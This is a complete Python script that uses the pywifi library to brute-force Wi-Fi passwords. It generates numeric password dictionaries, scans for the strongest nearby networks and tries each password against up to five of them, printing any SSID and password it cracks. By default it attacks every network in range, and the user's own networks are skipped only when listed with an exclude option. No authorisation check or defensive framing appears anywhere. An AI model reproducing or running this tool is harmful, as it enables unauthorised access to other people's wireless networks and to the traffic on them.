"""Wi-Fi password brute-force tool built on pywifi.

Scans for nearby Wi-Fi networks and tries to connect to them using
passwords read from a dictionary file (one password per line).

Requirements
------------
- Python 3.7+
- pywifi  (``pip install pywifi``)
- a Wi-Fi adapter supported by pywifi (Windows / Linux)

Usage
-----
Generate an 8-digit numeric dictionary::

    python wifi_bruteforce.py --generate-dict --length 8 --alphabet digits

Scan and brute-force up to 5 networks::

    python wifi_bruteforce.py --dict passwords.txt --count 5

Exclude one or more networks from the attack::

    python wifi_bruteforce.py --dict passwords.txt --exclude HomeWiFi OfficeWiFi
"""

import argparse
import itertools
import sys
import time
from pathlib import Path

try:
    import pywifi
except ImportError:  # pragma: no cover - depends on the environment
    pywifi = None

DEFAULT_DICT = Path("passwords.txt")
DEFAULT_COUNT = 5
CONNECT_TIMEOUT = 5  # seconds to wait for a connection attempt


# ---------------------------------------------------------------------------
# Dictionary generation
# ---------------------------------------------------------------------------

def generate_password_dict(alphabet: str, length: int, path: Path) -> int:
    """Write every combination of ``alphabet`` of size ``length`` to ``path``.

    Returns the number of passwords written. Be careful: the output file
    grows extremely fast (10 ** 8 lines for 8 digits), so keep the alphabet
    small and/or the length short.
    """
    path.parent.mkdir(parents=True, exist_ok=True)
    count = 0
    with path.open("w", encoding="utf-8", newline="\n") as handle:
        for combo in itertools.product(alphabet, repeat=length):
            handle.write("".join(combo) + "\n")
            count += 1
    return count


# ---------------------------------------------------------------------------
# pywifi helpers
# ---------------------------------------------------------------------------

def get_interface():
    """Return the first Wi-Fi interface exposed by pywifi."""
    if pywifi is None:
        raise RuntimeError(
            "pywifi is not installed. Install it with: pip install pywifi"
        )
    wifi = pywifi.PyWiFi()
    interfaces = wifi.interfaces()
    if not interfaces:
        raise RuntimeError("No Wi-Fi interface found on this machine.")
    return interfaces[0]


def scan_networks(iface, exclude, count):
    """Scan for nearby networks and return up to ``count`` SSIDs.

    ``exclude`` is a set of SSIDs to skip. The strongest signal wins for
    duplicate SSIDs, and results are sorted strongest first.
    """
    iface.scan()
    time.sleep(3)
    results = iface.scan_results()

    strongest = {}
    for profile in results:
        ssid = profile.ssid
        if not ssid or ssid in exclude:
            continue
        signal = profile.signal
        if ssid not in strongest or signal > strongest[ssid]:
            strongest[ssid] = signal

    ranked = sorted(strongest.items(), key=lambda item: item[1], reverse=True)
    return [ssid for ssid, _ in ranked[:count]]


def test_wifi(iface, ssid, password):
    """Try to connect to ``ssid`` with ``password``. Return True on success."""
    const = pywifi.const
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)
    iface.connect(tmp_profile)

    time.sleep(CONNECT_TIMEOUT)
    connected = iface.status() == const.IFACE_CONNECTED
    iface.disconnect()
    return connected


def bruteforce_wifi(iface, ssids, dictionary):
    """Try passwords from ``dictionary`` against each SSID in ``ssids``.

    Returns a list of ``(ssid, password)`` tuples that were cracked.
    """
    cracked = []
    remaining = list(ssids)
    with dictionary.open("r", encoding="utf-8") as handle:
        for raw in handle:
            password = raw.strip()
            if not password:
                continue
            for ssid in list(remaining):
                print(f"[*] trying {ssid!r} -> {password!r}")
                if test_wifi(iface, ssid, password):
                    print(f"[+] cracked {ssid!r} with password {password!r}")
                    cracked.append((ssid, password))
                    remaining.remove(ssid)
            if not remaining:
                break
    return cracked


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main(argv=None):
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--generate-dict",
        action="store_true",
        help="only generate a password dictionary and exit",
    )
    parser.add_argument(
        "--dict",
        type=Path,
        default=DEFAULT_DICT,
        help="path to the password dictionary file",
    )
    parser.add_argument(
        "--alphabet",
        default="0123456789",
        help="alphabet used when generating a dictionary",
    )
    parser.add_argument(
        "--length",
        type=int,
        default=8,
        help="password length used when generating a dictionary",
    )
    parser.add_argument(
        "--count",
        type=int,
        default=DEFAULT_COUNT,
        help="max number of networks to attack",
    )
    parser.add_argument(
        "--exclude",
        nargs="*",
        default=[],
        help="SSIDs to skip",
    )
    args = parser.parse_args(argv)

    if args.generate_dict:
        total = generate_password_dict(args.alphabet, args.length, args.dict)
        print(f"Wrote {total} passwords to {args.dict}")
        return 0

    iface = get_interface()
    exclude = {ssid for ssid in args.exclude if ssid}
    ssids = scan_networks(iface, exclude, args.count)
    print(f"Targeting networks: {ssids}")

    cracked = bruteforce_wifi(iface, ssids, args.dict)
    if cracked:
        print("\nCracked networks:")
        for ssid, password in cracked:
            print(f"  {ssid}: {password}")
    else:
        print("\nNo network was cracked.")
    return 0


if __name__ == "__main__":
    sys.exit(main())